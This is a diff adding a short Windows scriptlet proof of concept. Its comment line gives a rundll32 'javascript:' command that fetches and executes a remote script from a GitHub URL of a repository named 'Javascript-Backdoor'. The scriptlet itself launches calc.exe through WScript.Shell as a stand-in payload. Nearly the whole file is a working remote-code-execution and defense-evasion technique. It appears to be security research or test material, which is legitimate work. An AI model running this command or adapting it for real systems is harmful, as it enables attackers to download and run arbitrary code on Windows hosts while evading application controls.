@@ -1,0 +1,15 @@
+// rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+
+<?xml version="1.0"?>
+
+<package>
+<component id="testCalc">
+
+<script language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+]]>
+</script>
+
+</component>
+</package>
